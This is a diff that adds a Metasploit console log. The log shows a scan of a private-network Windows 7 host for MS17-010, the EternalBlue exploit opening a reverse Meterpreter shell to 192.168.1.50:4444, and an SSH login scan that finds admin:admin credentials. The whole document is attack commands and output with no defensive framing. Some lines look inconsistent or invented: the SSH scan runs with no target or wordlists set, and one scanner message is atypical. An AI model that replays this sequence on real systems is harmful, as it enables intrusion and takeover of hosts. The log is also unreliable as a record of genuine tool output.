@@ -1,0 +1,36 @@
+
+       =[ metasploit v6.3.4-dev                          ]
++ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
++ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Use the resource command to run commands from a file
+
+msf6 > use auxiliary/scanner/smb/smb_ms17_010
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.10
+RHOSTS => 192.168.1.10
+msf6 auxiliary(scanner/smb/smb_ms17_010) > run
+
+[*] 192.168.1.10:445       - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.1.10:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 192.168.1.10:445       - CVE-2017-0144 reference found in scan data
+[*] Auxiliary module execution completed
+
+msf6 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.10
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 192.168.1.50:4444
+[*] 192.168.1.10:445 - Executing automatic check (disable AutoCheck to override)
+[+] 192.168.1.10:445 - The target is vulnerable.
+[*] 192.168.1.10:445 - Connecting to target for exploitation.
+[+] 192.168.1.10:445 - Connection established for exploitation.
+[*] 192.168.1.10:445 - Sending SMB Fragments...
+[+] 192.168.1.10:445 - Meterpreter session 1 opened
+
+msf6 > use auxiliary/scanner/ssh/ssh_login
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+
+[-] 192.168.1.10:22 - Failed: 'root:toor'
+[+] 192.168.1.10:22 - Login Successful: admin:admin
+[*] Scanned 1 of 1 hosts (100% complete)
